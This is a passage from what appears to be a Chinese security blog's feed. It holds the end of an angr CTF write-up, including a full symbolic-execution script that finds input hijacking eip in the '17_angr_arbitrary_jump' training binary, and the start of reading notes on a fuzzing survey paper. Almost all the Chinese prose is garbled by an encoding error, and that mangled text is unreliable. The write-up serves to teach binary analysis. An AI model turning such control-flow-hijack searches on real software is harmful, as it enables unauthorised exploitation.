æ¥è¿›è¡Œå•æ­¥æ‰§è¡Œï¼Œè‹¥å…¶ä¸­æŸä¸€æ­¥è·å¾—äº† unconstrained state åˆ™æˆ‘ä»¬éå†å…¶ä¸­çŠ¶æ€å¹¶åˆ¤æ–­æ˜¯å¦å¯ä»¥æ»¡è¶³æ§åˆ¶ eip ä¸ºæŒ‡å®šå€¼çš„çº¦æŸï¼Œè‹¥æ˜¯åˆ™ç›´æ¥æ·»åŠ åˆ° <code>simgr.found</code> åˆ—è¡¨ä¸­å³å¯</p><p>æ•…æœ€ç»ˆçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-comment"># filter to check satisfiability</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_func</span>(<span class="hljs-params">state</span>):<br>    print_good_addr = <span class="hljs-number">0x58465168</span><br>    <span class="hljs-keyword">return</span> state.satisfiable(extra_constraints = (state.regs.eip == print_good_addr, ))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-comment"># hook the scanf to symbolize our input</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmtstr, input_addr</span>):<br>            input_bvs = claripy.BVS(<span class="hljs-string">&#x27;input_addr&#x27;</span>, <span class="hljs-number">200</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> <span class="hljs-built_in">chr</span> <span class="hljs-keyword">in</span> input_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(<span class="hljs-built_in">chr</span> &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-built_in">chr</span> &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(input_addr, input_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;input_val&#x27;</span>] = input_bvs<br>            <br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, SimScanfProcedure())<br><br>    <span class="hljs-comment"># create simgr that can save unconstraints</span><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state, <br>                               save_unconstrained=<span class="hljs-literal">True</span>,<br>                               stashes = &#123;<br>                                   <span class="hljs-string">&#x27;active&#x27;</span>:[init_state],<br>                                   <span class="hljs-string">&#x27;unconstrained&#x27;</span>:[],<br>                                   <span class="hljs-string">&#x27;found&#x27;</span>:[],<br>                               &#125;)<br><br>    <span class="hljs-comment"># simulated execution by steps</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> simgr.found:<br>        <span class="hljs-comment"># no more states for execution</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> simgr.active) <span class="hljs-keyword">and</span> (<span class="hljs-keyword">not</span> simgr.unconstrained):<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-comment"># check for unconstrained states</span><br>        simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, <br>                  to_stash = <span class="hljs-string">&#x27;found&#x27;</span>,<br>                  filter_func = filter_func)<br><br>        <span class="hljs-comment"># step to next basic block</span><br>        simgr.step()<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] found &#123;&#125; solution state(s)&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(simgr.found)))<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        print_good_addr = <span class="hljs-number">0x58465168</span><br>        solution_state.add_constraints(solution_state.regs.eip == print_good_addr)<br>        input_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;input_val&#x27;</span>], <br>                                               cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(input_val))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯è·å¾— <code>&quot;Good Job.&quot;</code></p><p><img src="https://s2.loli.net/2022/12/03/Zf6w1xrNFc5HvLI.png" alt="image.png"></p><p>è‡³æ­¤ï¼Œangr CTF çš„ 18 é“é¢˜ç›®<strong>å…¨éƒ¨å®Œç»“</strong></p><h1>0xFF.Whatâ€™s moreâ€¦</h1><p>ä½œä¸ºç”¨æ¥å…¥é—¨ angr åŸºæœ¬ç”¨æ³•çš„é¢˜ç›®ï¼Œangr CTF è‡ªç„¶ä¸ä¼šå¤ªéš¾ï¼Œä¸è¿‡ç¬”è€…ç¡®ä¹é€šè¿‡ angr ä½“ä¼šåˆ°äº†<strong>ç¬¦å·æ‰§è¡Œè¿™ä¸€æŠ€æœ¯çš„ç¾æ„Ÿæ‰€åœ¨</strong>ï¼ˆè™½ç„¶è¯´è¿™ä¸ªæ„Ÿè§¦å¥½åƒæ¯”è¾ƒç„å­¦ : ) ï¼‰</p><p>ä¸åŒäºä»£ç å®¡è®¡æˆ–æ˜¯æ¯”è¾ƒåâ€œæš´åŠ›â€çš„ fuzzï¼Œç¬¦å·æ‰§è¡Œè¿™ä¸€æŠ€æœ¯è¿˜å‘æˆ‘ä»¬å±•ç°äº†å…·æœ‰åˆ«æ ·ç¾æ„Ÿçš„æ¼æ´æŒ–æ˜ä¸ exp ç¼–å†™æŠ€å·§ï¼Œä»¥ angr CTF ä¸ºä¾‹ï¼Œè™½ç„¶è¯´æœ€åä¸‰é“æ¼æ´åˆ©ç”¨é¢˜ç›®çœ‹èµ·æ¥å¥½åƒéƒ½æŒºç¬¨ï¼Œä½†è®¾æƒ³å°†ç¬¬ 17 é¢˜æ¢æˆè¿™æ ·çš„ä¸€ä¸ªåœºæ™¯â€”â€”æˆ‘ä»¬æ­£åœ¨æŒ–æ˜ä¸€ä¸ªé€»è¾‘æ¯”è¾ƒå¤æ‚çš„ç°ä»£è½¯ä»¶ï¼ˆä¾‹å¦‚ä¸€ä¸ªå­˜åœ¨æ ˆæº¢å‡ºçš„è·¯ç”±å™¨å›ºä»¶ï¼Œæˆ‘ä»¬çš„è¾“å…¥å¯ä»¥æ˜¯å‘è·¯ç”±å™¨å‘é€çš„æ•°æ®åŒ…ï¼ˆæ¯”å¦‚è¯´å¯¹è·¯ç”±å™¨æ§åˆ¶é¡µçš„ HTTP è¯·æ±‚ï¼‰ï¼‰ï¼Œç›´æ¥é€†å‘å®¡è®¡æ¯”è¾ƒè´¹åŠ²ï¼Œè€Œæš´åŠ› fuzz åˆä¸å¥½æ­æ‰§è¡Œç¯å¢ƒï¼Œæ­¤æ—¶æ— éœ€å®é™…æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶çš„ç¬¦å·æ‰§è¡Œä¾¿èƒ½å¾ˆå¥½åœ°å‘æŒ¥å…¶ç”¨å¤„</p><p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ä»¥ä¸Šçš„ 18 é“é¢˜è™½ç„¶çœ‹ä¼¼æ¶µç›–äº† angr çš„åŸºæœ¬ç”¨æ³•ï¼Œä½†å…¶å® angr è¿˜æœ‰æ›´å¤šæ›´æœ‰è¶£çš„ APIï¼Œè‹¥æ˜¯è¦æ›´åŠ ç†Ÿç»ƒçš„è¿ç”¨è¿™ä¸ªé¡¶çº§çš„æ··åˆæ‰§è¡Œæ¡†æ¶ï¼Œåˆ™è¿˜éœ€è¦æˆ‘ä»¬å¤šå¤šé˜…è¯» angr çš„æ–‡æ¡£å¹¶å¤šåŠ ä½¿ç”¨ï¼Œæ¯•ç«Ÿ angr-ctf åªæ˜¯ä¸€ä¸ªæœ€åŸºç¡€çš„ç»ƒæ‰‹çº§çš„é¡¹ç›®ï¼ˆç¬‘ï¼‰</p><p>ç¬¦å·æ‰§è¡Œè¿™ä¸€æŠ€æœ¯æˆ–è®¸è¿˜æœ‰æ›´ä¸ºå…‰æ˜çš„æœªæ¥æ­£ç­‰å¾…ç€æˆ‘ä»¬è¿›è¡Œæ¢ç´¢ï¼šï¼‰</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä½ è¯´çš„å¯¹ï¼Œä½†æ˜¯ &lt;a href=&quot;https://github.com/angr/angr&quot;&gt;angr&lt;/a&gt; æ˜¯ä¸€ä¸ªä½¿ç”¨ Python ç¼–å†™çš„è·¨å¹³å°å¼€æºäºŒè¿›åˆ¶åˆ†ææ¡†æ¶â€¦&lt;/p&gt;</summary>
    
    
    
    <category term="ANGR" scheme="http://blog.arttnba3.cn/categories/ANGR/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="angr" scheme="http://blog.arttnba3.cn/tags/angr/"/>
    
    <category term="ç¬¦å·æ‰§è¡Œ" scheme="http://blog.arttnba3.cn/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="äºŒè¿›åˆ¶å®‰å…¨" scheme="http://blog.arttnba3.cn/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    <category term="äºŒè¿›åˆ¶åˆ†æ" scheme="http://blog.arttnba3.cn/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ã€PAPER.0x00ã€‘è®ºæ–‡ç¬”è®°ï¼šFuzzing: A Survey for Roadmap </title>
    <link href="http://blog.arttnba3.cn/2022/10/30/PAPER-0X00-FUZZING_A_SURVEY_FOR_ROADMAP/"/>
    <id>http://blog.arttnba3.cn/2022/10/30/PAPER-0X00-FUZZING_A_SURVEY_FOR_ROADMAP/</id>
    <published>2022-10-30T05:35:21.000Z</published>
    <updated>2022-10-30T12:18:32.780Z</updated>
    
    <content type="html"><![CDATA[<p>æ¨¡ç³Šæµ‹è¯•ä¸ºä»€ä¹ˆæ˜¯ç¥</p><span id="more"></span><h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><em><strong>Fuzzing: A Survey for Roadmap</strong></em> æ˜¯å…³äºæ¨¡ç³Šæµ‹è¯•é¢†åŸŸçš„æ¯”è¾ƒå¥½çš„ä¸€ç¯‡ç»¼è¿°ï¼Œè€Œæ°å·§ç¬”è€…æƒ³è¦å¼€å§‹æ¥è§¦ä¸€äº›å­¦æœ¯ä¸Šçš„ä¸œè¥¿ï¼Œæ‰€ä»¥å†³å®šä»è¿™ç¯‡ç»¼è¿°æ€§è®ºæ–‡å¼€å§‹å…¥æ‰‹å»äº†è§£æ¨¡ç³Šæµ‹è¯•è¿™ä¸€é¢†åŸŸï¼šï¼‰</p><p>è¿™ç¯‡åšå®¢ä¾¿æ˜¯ç¬”è€…çš„ä¸€ä¸ªè¯»ä¹¦ç¬”è®°ï¼Œä¸è¿‡ç¬”è€…ä¸ä¼šå°†è®ºæ–‡å…¨éƒ¨äººå·¥ç¿»è¯‘ååŸæ ·ç…§æ¬è¿‡æ¥ï¼Œè€Œåªä¼šé€‰æ‹©æ¯”è¾ƒç²¾é«“çš„éƒ¨åˆ†ï¼Œå¹¶æŒ‰ç¬”è€…çš„æ„æ€è¿›è¡Œæ’ç‰ˆï¼ˆç¬‘ï¼‰</p><blockquote><p>å½“ç„¶ç°åœ¨çœ‹æ¥å¥½åƒå¤§éƒ¨åˆ†å…¶å®è¿˜æ˜¯ç…§æ¬ç¬”è€…äººå·¥ç¿»è¯‘åçš„è®ºæ–‡åŸæ–‡ï¼Œç¬”è€…åšçš„é¢å¤–å·¥ä½œå¥½åƒä»…ä»…æ˜¯æ’ç‰ˆä¼˜åŒ–â€¦</p></blockquote><h2 id="Abstract">Abstract</h2><p><strong>Fuzz testing</strong>ï¼ˆfuzzingï¼Œå³æ¨¡ç³Šæµ‹è¯•ï¼‰åœ¨æ£€æµ‹å®‰å…¨æ¼æ´ä¸­å¤§æ”¾å¼‚å½©ï¼Œå…¶é€šè¿‡ç”Ÿæˆå¤§é‡çš„æµ‹è¯•ç”¨ä¾‹ï¼ˆtest casesï¼‰å¹¶è§‚æµ‹æ‰§è¡Œç»“æœæ¥å¯»æ‰¾æ¼æ´ï¼Œä¸”å·²åœ¨å¤§é‡çš„åº”ç”¨ä¸­å‘ç°äº†ä¸Šåƒä¸ªæ¼æ´ã€‚è™½ç„¶éå¸¸é«˜æ•ˆï¼Œfuzz ä»ç¼ºä¹ç³»ç»ŸåŒ–çš„å¯¹å…¶ç¼ºé™·çš„åˆ†æï¼š</p><ul><li>fuzz éœ€è¦ç¼©å°<strong>è¾“å…¥ç©ºé—´</strong>ï¼ˆinput spaceï¼‰ä¸<strong>ç¼ºé™·ç©ºé—´</strong>ï¼ˆdefect spaceï¼Œè§¦å‘ç¼ºé™·çš„è¾“å…¥ï¼‰é—´çš„å·®è·ï¼›åœ¨ä¸€ä¸ªåº”ç”¨å½“ä¸­ï¼Œæ¼æ´ï¼ˆdefectsï¼‰çš„å­˜åœ¨æ˜¯åˆ†æ•£çš„ï¼ˆspareï¼‰ï¼Œè¿™æ„å‘³ç€ defects space è¦æ¯” input space å°å¾—å¤š</li><li>fuzzing ç”Ÿæˆå¤§é‡çš„æµ‹è¯•ç”¨ä¾‹è¿›è¡Œé‡å¤æµ‹è¯•â€”â€”è¿™éœ€è¦ä¸€ç§è‡ªåŠ¨åŒ–çš„æ–¹æ³•ï¼›ç”±äºç¨‹åºä¸æ¼æ´çš„å¤æ‚æ€§ï¼Œè‡ªåŠ¨åŒ–åœ°æ‰§è¡Œä¸åŒçš„ç¨‹åºä¼šæ˜¯ä¸€ä¸ªæŒ‘æˆ˜</li></ul><p>æœ¬ç¯‡è®ºæ–‡ç³»ç»ŸåŒ–åœ°å›é¡¾å¹¶è¯„ä¼°äº† fuzz çš„ç¼ºé™·æœºå™¨è§£å†³åŠæ³•</p><h1>0x01. INTRODUCTION</h1><p>è½¯ä»¶æ¼æ´æ˜¯è®¡ç®—æœºç³»ç»Ÿä¸­çš„ä¸€ä¸ªä¸¥é‡çš„é—®é¢˜ï¼Œè€Œ Fuzz testing å·²ç»æˆä¸ºæœ€æˆåŠŸçš„æ£€æµ‹ç¨‹åºæ¼æ´çš„æ–¹æ³•ä¹‹ä¸€ï¼Œå…¶é€šè¿‡ç”Ÿæˆå¤§é‡çš„æµ‹è¯•ç”¨ä¾‹æ¥é‡å¤æµ‹è¯•ç›®æ ‡ç¨‹åºå¹¶è§‚å¯Ÿå…¶<strong>å¼‚å¸¸</strong>ï¼ˆexceptionï¼‰â€”â€”å®‰å…¨æ¼æ´çš„æ ‡å¿—ï¼ˆindicatorï¼‰</p><p>Fuzzing é€šå¸¸æœ‰ç€ä¸€ç»„ç§å­ï¼ˆseedsï¼‰ï¼šinteresting inputsï¼Œæ–°çš„è¾“å…¥çš„ç”Ÿæˆåˆ™åŸºäºè¿™ç»„ç§å­è¿›è¡Œæ— é™çš„å˜å¼‚ï¼ˆmutateï¼‰</p><p>è™½ç„¶ fuzzing åœ¨å‘ç°å®‰å…¨æ¼æ´ä¸Šè·å¾—äº†å·¨å¤§çš„æˆåŠŸï¼Œåœ¨å¼€å‘é«˜æ•ˆçš„æ¼æ´æ£€æµ‹è§£å†³æ–¹æ¡ˆä¸Šä»å­˜åœ¨ç€ç¼ºé™·ï¼Œå¦‚ Fig.1 æ‰€ç¤ºï¼Œä¸‰ä¸ªä¸»è¦çš„ç¼ºé™·æ˜¯ï¼šè¾“å…¥ä¸­åˆ†æ•£çš„æ¼æ´ç©ºé—´ï¼Œä¸¥æ ¼çš„æœ‰æ•ˆè¾“å…¥ç©ºé—´ï¼Œå¤šç›®æ ‡çš„è‡ªåŠ¨åŒ–æ‰§è¡Œ</p><p><img src="https://s2.loli.net/2022/10/26/MoW9IBHGRvk35bV.png" alt="Fig. 1. Illustration of knowledge gaps in the domain of fuzzing. "></p><ul><li><strong>Gap 1: spare defect space of inputs.</strong> åœ¨åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´åˆ†å¸ƒæ˜¯åˆ†æ•£çš„ï¼Œè€Œä»…æœ‰éƒ¨åˆ†ç‰¹å®šçš„è¾“å…¥èƒ½å¤Ÿè§¦å‘æ¼æ´ï¼›æµ…æ˜¾çš„æ¼æ´å¯ä»¥åœ¨çŸ­æ—¶é—´å†…è¢« fuzz åˆ°ï¼Œä½†è®¸å¤šå®‰å…¨æ¼æ´éœ€è¦æµ‹è¯•å¤æ‚çš„æ‰§è¡Œè·¯å¾„å¹¶è§£å†³ä¸¥æ ¼çš„è·¯å¾„çº¦æŸï¼Œå› æ­¤ä¸€ä¸ªé«˜æ•ˆçš„ fuzzing ç®—æ³•éœ€è¦åŒæ—¶å¯¹ <em>å¾…æµ‹è¯•ç¨‹åº</em> ï¼ˆprogram under testï¼Œ <strong>PUTs</strong>ï¼‰ä¸ <em>å®‰å…¨ç¼ºé™·</em> ï¼ˆsecurity flawsï¼‰è¶³å¤Ÿç²¾é€šï¼Œä»¥åœ¨ä¸€ä¸ªæ›´æœ‰å¯èƒ½å­˜åœ¨æ¼æ´çš„ä»£ç åŒºåŸŸé©±åŠ¨è®¡ç®—èµ„æº</li><li><strong>Gap 2: strict valid input space.</strong> å¤§éƒ¨åˆ†ç¨‹åºæœ‰ç€è‡ªå·±çš„è¾“å…¥ç©ºé—´ï¼Œè€Œç°ä»£ç¨‹åºéƒ½ç›¸å½“å¤æ‚ï¼Œéœ€è¦æ›´å¤æ‚çš„ç‰¹åŒ–è¾“å…¥ç©ºé—´ï¼Œå› æ­¤å¦‚ä½•ç”Ÿæˆæœ‰æ•ˆè¾“å…¥åŒæ ·æ˜¯ä¸ªæŒ‘æˆ˜ï¼›æ­¤å¤–ï¼Œä¸ºäº†æé«˜ fuzzing çš„æ•ˆç‡ï¼Œç”Ÿæˆçš„è¾“å…¥åº”å½“ä½¿ç”¨ä¸åŒçš„æ‰§è¡ŒçŠ¶æ€ï¼ˆä¾‹å¦‚ <em>ä»£ç è¦†ç›–ç‡</em> ï¼‰ï¼Œè¿™éœ€è¦æ›´å…ˆè¿›çš„æ–¹æ¡ˆæ¥ç”Ÿæˆæœ‰æ•ˆè¾“å…¥ï¼›è‹¥ç¼ºä¹å¯¹ PUTs çš„ç³»ç»ŸåŒ–åˆ†æï¼Œå‡ ä¹ä¸å¯èƒ½ç²¾ç¡®åœ°é™åˆ¶è¾“å…¥ç©ºé—´ï¼ˆä¾‹å¦‚ PDF æ–‡ä»¶çš„å˜å¼‚ç”Ÿæˆå¯èƒ½ä¼šè¿å PDF è§„èŒƒï¼‰</li><li><strong>Gap 3: various target.</strong> ç”±äº fuzzing å¤§é‡é‡å¤åœ°æµ‹è¯• PUTsï¼Œè¿™éœ€è¦é«˜æ•ˆçš„è‡ªåŠ¨åŒ–æ–¹æ³•ã€‚PUTs ä¸æ¼æ´éƒ½æ˜¯å¤šç§å¤šæ ·çš„ï¼Œæœ‰çš„ç¨‹åºå¯ä»¥ç®€å•ç›´æ¥åœ°è¢«è‡ªåŠ¨åŒ–åœ° fuzzï¼ˆä¾‹å¦‚å‘½ä»¤è¡Œç¨‹åºï¼‰ï¼Œä½†è®¸å¤šç¨‹åºåœ¨è‡ªåŠ¨åŒ–æµ‹è¯•å‰éƒ½éœ€è¦åšå¤§é‡çš„å·¥ä½œï¼ˆä¾‹å¦‚ç¡¬ä»¶ï¼‰ï¼›æ­¤å¤–ï¼Œå®‰å…¨ç¼ºé™·åŒæ ·éœ€è¦è‡ªåŠ¨åŒ–çš„ indicator ä»¥è®°å½•æ½œåœ¨çš„çœŸæ­£æ¼æ´ï¼Œ<strong>ç¨‹åºå´©æºƒ</strong>æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„ indicator å› ä¸ºå…¶å¯ä»¥è¢« OS è‡ªåŠ¨æ•è·ï¼Œä½†æœ‰çš„å®‰å…¨ç¼ºé™·<strong>å¹¶ä¸ä¼šè¡¨ç°å‡ºå´©æºƒ</strong>ï¼ˆä¾‹å¦‚æ¡ä»¶ç«äº‰ï¼‰ï¼Œè¿™éœ€è¦ç²¾å¿ƒè®¾è®¡çš„ indicator</li></ul><p>ä¸šç•Œåœ¨ç¼©å°è¿™äº›ç¼ºé™·ä¸Šåšå‡ºäº†è®¸å¤šåŠªåŠ›ã€‚åœ¨æœ¬ç¯‡è®ºæ–‡ä¸­ï¼Œç ”ç©¶è€…ç³»ç»ŸåŒ–åœ°å›é¡¾ä¸åˆ†æäº† fuzzing çš„ç¼ºé™·ä¸è§£å†³æ–¹æ¡ˆï¼ŒåŒæ—¶è€ƒè™‘äº†å¹¿åº¦ä¸æ·±åº¦</p><p>æœ¬ç¯‡è®ºæ–‡ç›®å½•å¦‚ä¸‹ï¼š</p><ul><li><strong>Â§2</strong>ï¼šoverview of fuzzing</li><li><strong>Â§3</strong>ï¼šdepicts fuzzing processes and various fuzzing theories to formulate he processes</li><li><strong>Â§4</strong>ï¼šanalyzes diverse solutions to reduce the search space of inputs</li><li><strong>Â§5</strong>ï¼šanalyzes how to automatize the execution of various PUTs and the detection of different bugs.</li><li><strong>Â§6</strong>ï¼šother some directions for future research</li></ul><h1>0x02. OVERVIEW OF FUZZING</h1><p><img src="https://s2.loli.net/2022/10/26/u6F7mKtzvRqxNWo.png" alt="Fig. 2. General workflow of fuzzing."></p><p>æˆ‘ä»¬é¦–å…ˆä»‹ç»ä¸€äº›æœ¯è¯­ï¼ˆ <strong>Terminologies.</strong> ï¼‰ï¼Œå¦‚ Fig2 æ‰€ç¤ºï¼š</p><ul><li><strong>seed</strong>ï¼šè¢«ä¿ç•™çš„èƒ½å®Œæˆæ›´å¥½çš„ fitness çš„è¾“å…¥ï¼ˆä¾‹å¦‚æä¾›æ–°çš„è¦†ç›–ç‡ï¼‰</li><li><strong>fitness</strong>ï¼šå¯¹ä¸€ä¸ª input/seed çš„è´¨é‡çš„æµ‹é‡</li><li><strong>power schedule</strong>ï¼šå†³å®šäº†åˆ†é…ç»™ seeds çš„ energy</li><li><strong>energy</strong>ï¼šåˆ†é…ç»™å½“å‰ fuzzing round çš„å˜å¼‚æ•°é‡</li><li><strong>fuzzer</strong>ï¼šfuzzing ç®—æ³•çš„å®ç°</li></ul><blockquote><p>è¿™é‡Œè®ºæ–‡è¿˜è®²äº†ä¸€æ®µå†å²ï¼Œä¸æŠ„äº†</p></blockquote><p>å¦‚ Fig2 æ‰€ç¤ºï¼Œfuzzing ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š</p><ul><li><strong>input generator</strong>ï¼šè´Ÿè´£å‘ executor æä¾›è¾“å…¥</li><li><strong>executor</strong>ï¼šè´Ÿè´£æ‰§è¡Œè¾“å…¥</li><li><strong>defect monitor</strong>ï¼šè´Ÿè´£æ£€æŸ¥æ˜¯å¦å‘ç°äº†æ–°çš„æ‰§è¡ŒçŠ¶æ€æˆ–ç¼ºé™·ï¼ˆä¾‹å¦‚ crashesï¼‰</li></ul><p>åŸºäºè¾“å…¥çš„ç”Ÿæˆæ–¹å¼ï¼Œfuzzing å¯ä»¥åˆ†ä¸ºï¼š</p><ul><li><strong>åŸºäºç”Ÿæˆçš„</strong> ï¼ˆgeneration-basedï¼‰ï¼šåŸºäº <em>æ–‡æ³•</em> ï¼ˆgrammarsï¼‰æˆ– <em>æœ‰æ•ˆè¯­æ–™åº“</em> ï¼ˆvalid corpusï¼‰ä»å¤´å¼€å§‹ç”Ÿæˆï¼›å¦‚ Fig2 æ‰€ç¤ºï¼Œå…¶ä»ä¸€ç»„ç§å­ä¸­ç›´æ¥è·å¾—è¾“å…¥</li><li><strong>åŸºäºå˜å¼‚çš„</strong>ï¼ˆmutation-basedï¼‰ï¼šå¯¹ç°æœ‰çš„ç§å­è¿›è¡Œ <em>å˜å¼‚</em> ï¼ˆmutateï¼‰ä»¥è·å¾—æ–°çš„è¾“å…¥ï¼›å¯¹ç»™å®šçš„ä¸€ç»„ç§å­ï¼ŒåŸºäºå˜å¼‚çš„æ¨¡ç³Šæµ‹è¯•é€šè¿‡ seed scheduleã€byte scheduleã€mutation schedule ä»¥è·å¾—è¾“å…¥</li></ul><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œfuzzing å¹¶ä¸éœ€è¦ç»å† Fig2 ä¸­çš„æ‰€æœ‰æ­¥éª¤ï¼Œä¾‹å¦‚åŸºäºç”Ÿæˆçš„æ¨¡ç³Šæµ‹è¯•å¹¶ä¸æ‰§è¡Œ byte schedule æˆ– mutation scheduleï¼Œä½†å…³æ³¨äºä»åˆå§‹è¾“å…¥æ–‡ä»¶ä¸­é€‰æ‹©æœ€ä¼˜çš„ç§å­ç»„</p></blockquote><p>åŸºäºæ‰§è¡Œæ—¶è§‚æµ‹åˆ°çš„ä¿¡æ¯é‡ï¼Œfuzzing å¯ä»¥åˆ†ä¸ºï¼š</p><ul><li><strong>é»‘ç›’</strong>ï¼ˆblackboxï¼‰ï¼šé»‘ç›’æ¨¡ç³Šæµ‹è¯•å¹¶ä¸çŸ¥é“æ¯æ¬¡æ‰§è¡Œçš„å†…éƒ¨çŠ¶æ€ï¼Œé€šè¿‡ä½¿ç”¨è¾“å…¥æ ¼å¼åŒ–æˆ–ä¸åŒçš„è¾“å‡ºçŠ¶æ€æ¥è¿›è¡Œä¼˜åŒ–</li><li><strong>ç™½ç›’</strong>ï¼ˆwhiteboxï¼‰ï¼šç™½ç›’æ¨¡ç³Šæµ‹è¯•å¯¹æ¯æ¬¡æ‰§è¡Œçš„å†…éƒ¨çŠ¶æ€æ˜¯å…¨éƒ¨å¾—çŸ¥çš„ï¼Œè¿™ä½¿å…¶èƒ½ç³»ç»ŸåŒ–åœ°æ¢ç´¢ç›®æ ‡ç¨‹åºçš„çŠ¶æ€ç©ºé—´ï¼›å…¶é€šå¸¸ä½¿ç”¨ concolic executionï¼ˆä¾‹å¦‚ <em>dynamic symbolic executionï¼Œå³åŠ¨æ€ç¬¦å·æ‰§è¡Œ</em> ï¼‰æ¥åˆ†æç›®æ ‡ç¨‹åº</li><li><strong>ç°ç›’</strong>ï¼ˆgreyboxï¼‰ï¼šç°ç›’æ¨¡ç³Šæµ‹è¯•è·å¾—çš„æ‰§è¡ŒçŠ¶æ€ä¿¡æ¯åœ¨é»‘ç›’ä¸ç™½ç›’ä¹‹é—´ï¼Œä¾‹å¦‚è®¸å¤š fuzzer éƒ½ä½¿ç”¨ <em>è¾¹ç•Œè¦†ç›–ç‡</em> ï¼ˆedge coverageï¼‰ä½œä¸ºå†…éƒ¨æ‰§è¡ŒçŠ¶æ€</li></ul><p>æœ€é€šç”¨çš„æ‰§è¡ŒçŠ¶æ€ä¾¿æ˜¯<strong>ä»£ç è¦†ç›–ç‡</strong>ï¼ˆcode coverageï¼Œä¾‹å¦‚ CFGsï¼ˆcontrol flow graphsï¼‰ ä¸­çš„åŸºæœ¬å—ï¼ˆbasic blockã€è¾¹ï¼ˆedgesï¼‰ï¼‰ï¼Œè¦†ç›–ç‡çš„åŸºæœ¬å‡è®¾ç”¨æ³•æ˜¯ï¼šå‘ç°æ›´å¤šçš„æ‰§è¡ŒçŠ¶æ€ï¼ˆä¾‹å¦‚æ–°çš„è¦†ç›–ç‡ï¼‰èƒ½æé«˜å‘ç°æ¼æ´çš„æ¦‚ç‡ã€‚å› æ­¤ <em>è¦†ç›–ç‡æŒ‡å¯¼</em> ï¼ˆcoverage-guidedï¼‰çš„æ¨¡ç³Šæµ‹è¯•çš„ç›®æ ‡ä¾¿æ˜¯è¦†ç›–æ›´å¤šçš„ä»£ç 